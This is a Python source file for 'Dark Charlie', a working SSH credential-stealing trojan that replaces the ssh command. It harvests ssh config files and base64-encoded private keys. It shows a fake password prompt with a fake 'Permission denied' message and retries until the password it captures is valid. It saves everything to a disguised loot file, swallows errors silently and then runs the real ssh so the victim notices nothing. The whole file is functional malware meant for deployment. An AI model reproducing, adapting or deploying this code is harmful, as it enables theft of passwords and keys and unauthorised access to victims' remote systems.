#! PYTHON_EXECUTABLE_GOES_HERE

'''
Dark Charlie remote shell cred grabber

Version 0.1

Using open-ended exceptions here to maintain silence when errors happen
'''

originalSSHExecutable = "ORIGINAL_SSH_EXE_GOES_HERE"

def cantLoadModuleError():
    import sys
    if sys.version_info.major < 3:
        return ImportError
    if sys.version_info.minor < 6:
        return ImportError
    else:
        return ModuleNotFoundError

def getLootFileName():
    import os
    thisFullPath = os.path.abspath(__file__)
    thisDirectory = os.path.split(thisFullPath)[0]
    lootFile = thisDirectory + os.sep + "ssh.conf"
    return os.path.join(lootFile)

def initializeThisScript():
    '''This function will be run the first time by the bunny'''
    import subprocess
    import re        
    pathFinder = subprocess.Popen("which python".split(), stdout = subprocess.PIPE)
    pythonExecutable = pathFinder.stdout.read().strip()
    pathFinder = subprocess.Popen("which ssh".split(), stdout = subprocess.PIPE)
    sshExecutable = pathFinder.stdout.read().strip()
    try:
        import paramiko
    except cantLoadModuleError():
        try:
            paramikoInstaller = subprocess.Popen("pip install --user paramiko".split(), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            paramikoInstaller = subprocess.Popen("pip3 install --user paramiko".split(), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        except:
            pass
    try:
        import json
    except cantLoadModuleError():
        try:
            jsonInstaller = subprocess.Popen("pip install --user json".split(), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
            jsonInstaller = subprocess.Popen("pip3 install --user json".split(), stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        except:
            pass
    try:
        import getpass
    except:
        try:
            getPassInstaller = subprocess.Popen("pip install --user getpass", stdout = subprocess.PIPE, stderr = subprocess.PIPE)
        except:
            pass
    thisFileName = __file__
    thisFile = open(thisFileName, 'r')
    originalCode = thisFile.read()
    thisFile.close()
    newCode = re.sub("PYTHON_EXECUTABLE_GOES_HERE", pythonExecutable, originalCode, 1)
    newCode = re.sub("ORIGINAL_SSH_EXE_GOES_HERE", sshExecutable, newCode, 1)
    thisFile = open(thisFileName, 'w')
    thisFile.write(newCode)
    thisFile.close()
    createLootFile(getLootFileName())
    quit()
    
def createLootFile(lootFileName):
    import json
    initialData = {"configFiles":{}, "passwords":{}}
    addDefaultSSHConfigFilesToLoot(initialData)
    lootFile = open(lootFileName, 'w')
    json.dump(initialData, lootFile)
    lootFile.close()

def addDefaultSSHConfigFilesToLoot(lootData): #using lootData as a reference here, no returns
    mainConfigData, userConfigData = analyzeDefaultSSHConfigFiles()
    mainConfigHash, mainData = mainConfigData
    userConfigHash, userData = userConfigData
    lootData["configFiles"][mainConfigHash] = mainData
    lootData["configFiles"]["main"] = mainData
    lootData["configFiles"][userConfigHash] = userData
    lootData["configFiles"]["user"] = userData
    
def analyzeDefaultSSHConfigFiles():
    import os
    try:
        mainConfigData = analyzeConfigFile("/etc/ssh/ssh_config")
        if mainConfigData:
            mainFileHash, mainData = mainConfigData
        else:
            mainFileHash = None
            mainData = None
    except:
        mainFileHash = None
        mainData = None
    try:
        userConfigFileName = os.getenv("HOME") + "/.ssh/config"
        userConfigData = analyzeConfigFile(userConfigFileName)
        if userConfigData:
            userFileHash, userData = userConfigData
        else:
            userFileHash = None
            userData = None
    except:
        userFileHash = None
        userData = None
    return ((mainFileHash, mainData), (userFileHash, userData))
    
def loadLootFile(lootFileName):
    import json
    try:
       file = open(lootFileName, 'r')
       data = json.load(file)
       file.close()
       return data
    except:
        return False
    
def saveLootFile(loot, lootFileName):
    import json
    try:
        file = open(lootFileName, 'w')
        json.dump(loot, file)
        file.close()
    except:
        pass
        
class SSHArgHandler(object):
    
    def __init__(self, rawArgList):
        self.password = None
        self.optionsDict = self.getOptionsDict(rawArgList)
        self.keyFileName = self.findArgument("-i", rawArgList)
        if self.keyFileName:
            self.keyFile = snarfKeyFile(self.keyFileName)
        else:
            self.keyFile = None
        self.configFile = self.findArgument("-F", rawArgList)
        if self.configFile:
            configFileInfo = analyzeConfigFile(self.configFile)
        else:
            configFileInfo = None
        if configFileInfo:
            self.configFileHash, self.configFileDict = configFileInfo
        else:
            self.configFileHash = None
            self.configFileDict = None
        self.host = rawArgList[-1]
        if "@" in self.host:
            self.host = self.host.split("@")[-1]
        self.port = self.findArgument("-p", rawArgList)
        self.user = self.findUserName(rawArgList)
        self.commandOptions = " ".join(rawArgList[1:])
        self.intendedCommand = originalSSHExecutable + " " + self.commandOptions
        
    def findUserName(self, args):
        user = self.findArgument("-l", args)
        if not user:
            if "@" in args[-1]:
                user = args[-1].split("@")[0]
        if not user:
            if "User" in self.optionsDict:
                user = self.optionsDict["User"]
        if not user:
            if self.configFileDict and self.host in self.configFileDict:
                if "User" in self.configFileDict[self.host]:
                    user = self.configFileDict[self.host]["User"]
        if not user:
            return "None"
        return user

    def getOptionsDict(self, args):
        interestingArgs = args[1:-1]
        options = {}
        for i in range(len(interestingArgs)):
            rawOption = None
            if interestingArgs[i].startswith("-o"):
                if len(interestingArgs[i]) > 2:
                    rawOption = interestingArgs[i][2:]
                elif i == len(interestingArgs) - 1:  #somebody probably messed up the command
                    continue
                else:
                    rawOption = interestingArgs[i + 1]
            if rawOption:
                optionList = rawOption.split("=")
                if len(optionList) == 2:
                    key, value = optionList
                    options[key] = value
        return options
    
    def findArgument(self, argOfInterest, args):  #this assumes the argument of interest should only show up in the command once
        interestingArgs = args[1:-1]
        for i in range(len(interestingArgs)):
            if interestingArgs[i].startswith(argOfInterest):
                if len(interestingArgs[i]) > 2 and not argOfInterest.startswith("--"):
                    value = interestingArgs[i][2:]
                elif i == len(interestingArgs) - 1:  #ten bucks says this probably won't run
                    continue
                else:
                    return interestingArgs[i + 1]
        return None
                
    def saveData(self):
        infoDict = {}
        if self.password:
            infoDict["password"] = self.password
        if self.optionsDict:
            infoDict["options"] = self.optionsDict
        if self.keyFile:
            infoDict["privateKey"] = self.keyFile
        if self.host:
            infoDict["host"] = self.host
        if self.port:
            infoDict["port"] = self.port
        if self.user:
            infoDict["user"] = self.user
        return infoDict
        
def analyzeConfigFile(configFileName):  #The tat rolled a 20?
    import os
    import re
    regexSplitter = re.compile("[\s\=]")    
    if not os.path.isfile(configFileName):
        return False
    file = open(configFileName, 'r')
    data = file.read()
    file.close()
    fileHash = hash(data)
    data = data.split("\n")
    currentHostNickname = "None"
    hostDict = {}
    for line in data:
        line = line.strip()
        if not line:
            continue
        if line.startswith("#"):
            continue
        if line.startswith("Host") and line.split()[0] == "Host":
            hostLine = re.split(regexSplitter, line)
            if len(hostLine) > 1:
                currentHostNickname = hostLine[1]
            else:
                currentHostNickname = "None"
            if not currentHostNickname in hostDict:
                hostDict[currentHostNickname] = {}
            continue
        lineSplit = re.split(regexSplitter, line)
        if len(lineSplit) == 1:
            hostDict[currentHostNickname][lineSplit[0]] = "None"
        else:
            key = lineSplit[0]
            value = " ".join(lineSplit[1:])
            try:
                if key == "IdentityFile":
                    keyRead = snarfKeyFile(value)
                    if not keyRead:
                        value += "(FILENOTFOUND)"
                    else:
                        value = keyRead
            except:
                value = "UnableToLoad"
            hostDict[currentHostNickname][key] = value
    return (fileHash, hostDict)

def snarfKeyFile(keyFileName):
    import os
    import base64
    if not os.path.isfile(keyFileName):
        return False
    keyFile = open(keyFileName, 'rb')
    key = keyFile.read()
    keyFile.close()
    return base64.b64encode(key).decode()                

def paramikoSaysWeNeedAPassword(host, port, user):
    try:
        import paramiko
    except cantLoadModuleError():
        return True #default to true if we can't check it        
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host, port = int(port), username = user)
        ssh.close()
        return False
    except paramiko.ssh_exception.SSHException:
        try:
            ssh.connect(host, port = int(port), username = user, password = "12345")  #probably not their real password unless they're an idiot and this is their luggage
            ssh.close()
            return False
        except paramiko.ssh_exception.AuthenticationException:
            return True
    except:
        return False
    
def paramikoApprovesOfThisPassword(host, port, user, password):
    try:
        import paramiko
    except cantLoadModuleError():
        return True #default to true if we can't check it        
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host, port = int(port), username = user, password = password)  #hopefully their real password
        ssh.close()
        return True
    except paramiko.ssh_exception.AuthenticationException:
        return False
       
def parseArguments():
    import sys
    argList = sys.argv
    if "--initializeScript" in sys.argv:
        initializeThisScript()
    else:
        return argList
    
def findHostInLootConfigs(lootFileData, host):
    for fileHash in lootFileData["configFiles"]:
        if lootFileData["configFiles"][fileHash] and host in lootFileData["configFiles"][fileHash]:  #have to check if there is even file data there, otherwise we end up indexing into nothing and failing hard
            return lootFileData["configFiles"][fileHash][host]
    return None

def getUserName():
    import getpass
    return getpass.getuser()

def lowDownDirtyDeceiver(user, hostAddress):
    import getpass
    prompt = "%s@%s's password: " %(user, hostAddress)
    password = getpass.getpass(prompt)
    print("Permission denied, please try again.")
    return password    

def shinyLetsBeBadGuys():
    argList = parseArguments()
    lootFileData = loadLootFile(getLootFileName())
    sshArgs = SSHArgHandler(argList)
    if sshArgs.configFileHash:
        lootFileData["configFiles"][sshArgs.configFileHash] = sshArgs.configFileDict
    addDefaultSSHConfigFilesToLoot(lootFileData)
    hostConfigFileData = findHostInLootConfigs(lootFileData, sshArgs.host)
    hostAddress = sshArgs.host
    userName = None
    hostPort = None
    password = None
    if lootFileData["configFiles"]["main"]:
        if "HostName" in lootFileData["configFiles"]["main"]:
            hostAddress = lootFileData["configFiles"]["main"]["HostName"]
        if "Port" in lootFileData["configFiles"]["main"]:
            hostPort = lootFileData["configFiles"]["main"]["Port"]
        if "IdentityFile" in lootFileData["configFiles"]["main"]:
            password = "file(%s)" %lootFileData["configFiles"]["main"]["IdentityFile"]
    if lootFileData["configFiles"]["user"]:
        if "HostName" in lootFileData["configFiles"]["user"]:
            hostAddress = lootFileData["configFiles"]["user"]["HostName"]
        if "Port" in lootFileData["configFiles"]["user"]:
            hostPort = lootFileData["configFiles"]["user"]["Port"]
        if "IdentityFile" in lootFileData["configFiles"]["user"]:
            password = "file(%s)" %lootFileData["configFiles"]["user"]["IdentityFile"]
    if hostConfigFileData:
        if "HostName" in hostConfigFileData:
            hostAddress = hostConfigFileData["HostName"]
        if "Port" in hostConfigFileData:
            hostPort = hostConfigFileData["Port"]
        if "IdentityFile" in hostConfigFileData:
            password = "file(%s)" %hostConfigFileData["IdentityFile"]
    if sshArgs.user:
        userName = sshArgs.user
    if sshArgs.port:
        hostPort = sshArgs.port
    if sshArgs.keyFile:
        password = "file(%s)" %sshArgs.keyFile
    if not userName:
        try:
            userName = getUserName()
        except:
            userName = "DefaultUserName"
    if not hostPort:
        hostPort = "22"
    hostInfo = "%s@%s:%s" %(userName, hostAddress, hostPort)  # user@hostAddress:port
    if not password:
        if not hostInfo in lootFileData["passwords"]:
            gotValidPass = False
            while not gotValidPass:
                try:
                    password = lowDownDirtyDeceiver(userName, hostAddress)
                except:
                    password = "FailedToObtain"
                    break
                try:
                    gotValidPass = paramikoApprovesOfThisPassword(hostAddress, hostPort, userName, password)
                except:
                    break
    lootFileData["passwords"][hostInfo] = [password, sshArgs.intendedCommand, sshArgs.saveData()] #json doesn't do tuples anyway
    saveLootFile(lootFileData, getLootFileName())
    
if __name__ == '__main__':
    import os
    args = parseArguments()
    intendedCommand = args[:]
    intendedCommand[0] = originalSSHExecutable
    intendedCommand = " ".join(intendedCommand)
    try:
        if len(args) > 1:
            shinyLetsBeBadGuys()
    except: #I really feel weird doing a massive open-ended exception here... but silence
        pass
    os.system(intendedCommand)
    quit()